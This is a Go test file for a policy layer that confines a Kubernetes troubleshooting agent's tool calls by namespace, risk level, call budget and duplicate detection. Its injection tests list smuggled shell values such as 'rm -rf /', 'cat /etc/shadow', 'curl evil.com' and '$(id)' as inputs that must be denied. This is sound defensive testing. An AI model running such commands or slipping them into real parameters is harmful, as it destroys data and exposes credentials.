package toolbox

import (
	"strings"
	"testing"
)

// helper — creates a registry and policy with the given config.
func newTestPolicy(cfg PolicyConfig) (*ToolRegistry, *Policy) {
	reg := NewToolRegistry()
	return reg, NewPolicy(reg, cfg)
}

// ---------------------------------------------------------------------------
// Rule (a): namespace confinement
// ---------------------------------------------------------------------------

func TestPolicyRejectsWrongNamespace(t *testing.T) {
	tests := []struct {
		name       string
		scopeNS    string
		paramNS    string
		wantDenied bool
	}{
		{"matching namespace", "production", "production", false},
		{"different namespace", "production", "staging", true},
		{"scope default, param kube-system", "default", "kube-system", true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			_, pol := newTestPolicy(PolicyConfig{})
			scope := InvestigationScope{Namespace: tt.scopeNS}
			denial, err := pol.Check("inv-1", scope, "list_pods", map[string]string{
				"namespace": tt.paramNS,
			})
			if tt.wantDenied {
				if err == nil {
					t.Fatal("expected denial, got nil error")
				}
				if !strings.HasPrefix(denial, "DENIED:") {
					t.Fatalf("denial should start with DENIED:, got %q", denial)
				}
			} else {
				if err != nil {
					t.Fatalf("unexpected denial: %v", err)
				}
			}
		})
	}
}

// ---------------------------------------------------------------------------
// Rule (b): Sensitive tools gated by AllowSensitive
// ---------------------------------------------------------------------------

func TestPolicyRejectsSensitiveToolByDefault(t *testing.T) {
	_, pol := newTestPolicy(PolicyConfig{AllowSensitive: false})
	scope := InvestigationScope{Namespace: "default"}
	denial, err := pol.Check("inv-2", scope, "get_configmap", map[string]string{
		"namespace": "default",
		"configmap": "my-config",
	})
	if err == nil {
		t.Fatal("expected denial for sensitive tool, got nil")
	}
	if !strings.Contains(denial, "Sensitive") {
		t.Fatalf("denial should mention Sensitive, got %q", denial)
	}
}

func TestPolicyAllowsSensitiveToolWhenConfigured(t *testing.T) {
	_, pol := newTestPolicy(PolicyConfig{AllowSensitive: true})
	scope := InvestigationScope{Namespace: "default"}
	denial, err := pol.Check("inv-3", scope, "get_configmap", map[string]string{
		"namespace": "default",
		"configmap": "my-config",
	})
	if err != nil {
		t.Fatalf("unexpected denial: %s — %v", denial, err)
	}
}

func TestPolicyAllowsReadOnlyToolRegardless(t *testing.T) {
	_, pol := newTestPolicy(PolicyConfig{AllowSensitive: false})
	scope := InvestigationScope{Namespace: "default"}
	denial, err := pol.Check("inv-4", scope, "list_pods", map[string]string{
		"namespace": "default",
	})
	if err != nil {
		t.Fatalf("ReadOnly tool should be allowed, got: %s — %v", denial, err)
	}
}

// ---------------------------------------------------------------------------
// Rule (c): call budget (max 12 per investigation)
// ---------------------------------------------------------------------------

func TestPolicyEnforcesCallBudget(t *testing.T) {
	_, pol := newTestPolicy(PolicyConfig{MaxCallsPerInvestigation: 3})
	scope := InvestigationScope{Namespace: "default"}

	// 3 distinct calls should succeed.
	tools := []string{"list_pods", "get_events", "describe_pod"}
	for i, tool := range tools {
		params := map[string]string{"namespace": "default"}
		if tool == "describe_pod" {
			params["pod"] = "my-pod"
		}
		_, err := pol.Check("inv-5", scope, tool, params)
		if err != nil {
			t.Fatalf("call %d (%s) should succeed, got: %v", i+1, tool, err)
		}
	}

	// 4th call exceeds the budget.
	denial, err := pol.Check("inv-5", scope, "get_deployment", map[string]string{
		"namespace":  "default",
		"deployment": "web",
	})
	if err == nil {
		t.Fatal("expected denial for exceeding call budget")
	}
	if !strings.Contains(denial, "maximum") {
		t.Fatalf("denial should mention 'maximum', got %q", denial)
	}
}

func TestPolicyDefaultBudgetIs12(t *testing.T) {
	reg := NewToolRegistry()
	pol := NewPolicy(reg, PolicyConfig{})
	scope := InvestigationScope{Namespace: "default"}

	for i := 0; i < 12; i++ {
		// Use describe_pod with a unique pod name each time to avoid dup detection.
		params := map[string]string{
			"namespace": "default",
			"pod":       strings.Repeat("a", i+1), // a, aa, aaa, ... up to 12
		}
		_, err := pol.Check("inv-budget", scope, "describe_pod", params)
		if err != nil {
			t.Fatalf("call %d should succeed, got: %v", i+1, err)
		}
	}

	// 13th call should be denied.
	_, err := pol.Check("inv-budget", scope, "describe_pod", map[string]string{
		"namespace": "default",
		"pod":       "final-pod",
	})
	if err == nil {
		t.Fatal("expected denial for 13th call")
	}
}

// ---------------------------------------------------------------------------
// Rule (d): duplicate call suppression
// ---------------------------------------------------------------------------

func TestPolicyRejectsDuplicateCall(t *testing.T) {
	_, pol := newTestPolicy(PolicyConfig{})
	scope := InvestigationScope{Namespace: "default"}

	params := map[string]string{"namespace": "default"}

	// First call succeeds.
	_, err := pol.Check("inv-6", scope, "list_pods", params)
	if err != nil {
		t.Fatalf("first call should succeed: %v", err)
	}

	// Identical second call is denied.
	denial, err := pol.Check("inv-6", scope, "list_pods", params)
	if err == nil {
		t.Fatal("expected denial for duplicate call")
	}
	if !strings.Contains(denial, "identical") {
		t.Fatalf("denial should mention 'identical', got %q", denial)
	}
}

func TestPolicyAllowsSameToolDifferentParams(t *testing.T) {
	_, pol := newTestPolicy(PolicyConfig{})
	scope := InvestigationScope{Namespace: "default"}

	_, err := pol.Check("inv-7", scope, "describe_pod", map[string]string{
		"namespace": "default",
		"pod":       "pod-a",
	})
	if err != nil {
		t.Fatalf("first call should succeed: %v", err)
	}

	_, err = pol.Check("inv-7", scope, "describe_pod", map[string]string{
		"namespace": "default",
		"pod":       "pod-b",
	})
	if err != nil {
		t.Fatalf("second call with different params should succeed: %v", err)
	}
}

func TestPolicyDuplicateDetectionIsCrossInvestigation(t *testing.T) {
	_, pol := newTestPolicy(PolicyConfig{})
	scope := InvestigationScope{Namespace: "default"}
	params := map[string]string{"namespace": "default"}

	// Two different investigations can make the same call.
	_, err := pol.Check("inv-8a", scope, "list_pods", params)
	if err != nil {
		t.Fatalf("inv-8a first call should succeed: %v", err)
	}
	_, err = pol.Check("inv-8b", scope, "list_pods", params)
	if err != nil {
		t.Fatalf("inv-8b same call should succeed (different investigation): %v", err)
	}
}

// ---------------------------------------------------------------------------
// Shell metacharacter rejection (policy layer)
// ---------------------------------------------------------------------------

func TestPolicyRejectsShellMetachars(t *testing.T) {
	tests := []struct {
		name  string
		value string
	}{
		{"semicolon", "my-pod; rm -rf /"},
		{"pipe", "my-pod | cat /etc/shadow"},
		{"ampersand", "my-pod && curl evil.com"},
		{"backtick", "my-pod`whoami`"},
		{"dollar-paren", "$(id)"},
		{"dollar-brace", "${HOME}"},
		{"redirect-gt", "my-pod > /tmp/pwned"},
		{"redirect-lt", "my-pod < /dev/null"},
		{"newline-escaped", "my-pod\\ntail"},
		{"backslash", "my-pod\\"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			_, pol := newTestPolicy(PolicyConfig{})
			scope := InvestigationScope{Namespace: "default"}
			denial, err := pol.Check("inv-mc", scope, "describe_pod", map[string]string{
				"namespace": "default",
				"pod":       tt.value,
			})
			if err == nil {
				t.Fatalf("expected denial for shell metachars %q, got nil", tt.value)
			}
			if !strings.HasPrefix(denial, "DENIED:") {
				t.Fatalf("denial should start with DENIED:, got %q", denial)
			}
		})
	}
}

// ---------------------------------------------------------------------------
// Flag-injection rejection (values starting with "-")
// ---------------------------------------------------------------------------

func TestPolicyRejectsFlagLikeValues(t *testing.T) {
	tests := []struct {
		name  string
		param string
		value string
	}{
		{"dash-dash flag in pod", "pod", "--delete-all"},
		{"single dash flag in namespace", "namespace", "-n"},
		{"dash flag in configmap", "configmap", "-o=json"},
		{"dash with payload", "pod", "-exec=whoami"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			_, pol := newTestPolicy(PolicyConfig{AllowSensitive: true})
			scope := InvestigationScope{Namespace: "default"}
			params := map[string]string{
				"namespace": "default",
				tt.param:    tt.value,
			}
			// For configmap tool we need configmap param too
			if tt.param == "configmap" {
				// namespace is already set
			} else if tt.param != "namespace" {
				// add namespace param
			}
			denial, err := pol.Check("inv-flag", scope, "describe_pod", params)
			if err == nil {
				t.Fatalf("expected denial for flag-like value %q in param %q", tt.value, tt.param)
			}
			if !strings.Contains(denial, "flag injection") {
				t.Fatalf("denial should mention flag injection, got %q", denial)
			}
		})
	}
}

// ---------------------------------------------------------------------------
// ResetInvestigation
// ---------------------------------------------------------------------------

func TestPolicyResetAllowsReuse(t *testing.T) {
	_, pol := newTestPolicy(PolicyConfig{MaxCallsPerInvestigation: 2})
	scope := InvestigationScope{Namespace: "default"}

	_, _ = pol.Check("inv-r", scope, "list_pods", map[string]string{"namespace": "default"})
	_, _ = pol.Check("inv-r", scope, "get_events", map[string]string{"namespace": "default"})

	// Budget exhausted.
	_, err := pol.Check("inv-r", scope, "describe_pod", map[string]string{"namespace": "default", "pod": "x"})
	if err == nil {
		t.Fatal("expected denial after budget exhausted")
	}

	// Reset and retry.
	pol.ResetInvestigation("inv-r")
	_, err = pol.Check("inv-r", scope, "list_pods", map[string]string{"namespace": "default"})
	if err != nil {
		t.Fatalf("after reset, call should succeed: %v", err)
	}
}

// ---------------------------------------------------------------------------
// Denial format — always starts with "DENIED:"
// ---------------------------------------------------------------------------

func TestDenialFormat(t *testing.T) {
	_, pol := newTestPolicy(PolicyConfig{})
	scope := InvestigationScope{Namespace: "production"}

	denial, _ := pol.Check("inv-fmt", scope, "list_pods", map[string]string{
		"namespace": "staging",
	})
	if !strings.HasPrefix(denial, "DENIED:") {
		t.Fatalf("denial should start with 'DENIED:', got %q", denial)
	}
}

// ---------------------------------------------------------------------------
// Risk field on ToolDefinition
// ---------------------------------------------------------------------------

func TestGetConfigmapIsMarkedSensitive(t *testing.T) {
	reg := NewToolRegistry()
	tool := reg.Lookup("get_configmap")
	if tool == nil {
		t.Fatal("get_configmap should be registered")
	}
	if tool.Risk != Sensitive {
		t.Fatalf("get_configmap should be Sensitive, got %s", tool.Risk)
	}
}

func TestOtherToolsAreReadOnly(t *testing.T) {
	reg := NewToolRegistry()
	readOnlyTools := []string{
		"get_pod_logs", "list_pods", "describe_pod",
		"get_events", "get_deployment", "get_service_endpoints",
		"get_node_conditions", "get_resource_usage", "get_hpa_status",
	}
	for _, name := range readOnlyTools {
		tool := reg.Lookup(name)
		if tool == nil {
			t.Fatalf("tool %q should be registered", name)
		}
		if tool.Risk != ReadOnly {
			t.Fatalf("tool %q should be ReadOnly, got %s", name, tool.Risk)
		}
	}
}

// ---------------------------------------------------------------------------
// Selector values are joined with = so they can never be parsed as flags
// (Requirement #4)
// ---------------------------------------------------------------------------

func TestListPodsLabelSelectorJoinedWithEquals(t *testing.T) {
	reg := NewToolRegistry()
	_, args, err := reg.ValidateAndBuild("list_pods", map[string]string{
		"namespace":      "default",
		"label_selector": "app=web",
	})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	found := false
	for _, a := range args {
		if a == "-l=app=web" {
			found = true
		}
		// Must NOT be passed as two separate args.
		if a == "-l" {
			t.Fatal("-l should not appear as a separate arg; it should be joined as -l=<value>")
		}
	}
	if !found {
		t.Fatalf("expected '-l=app=web' in args, got %v", args)
	}
}

func TestGetEventsFieldSelectorJoinedWithEquals(t *testing.T) {
	reg := NewToolRegistry()
	_, args, err := reg.ValidateAndBuild("get_events", map[string]string{
		"namespace":      "default",
		"field_selector": "involvedObject.name=my-pod",
	})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	found := false
	for _, a := range args {
		if a == "--field-selector=involvedObject.name=my-pod" {
			found = true
		}
	}
	if !found {
		t.Fatalf("expected '--field-selector=involvedObject.name=my-pod' in args, got %v", args)
	}
}
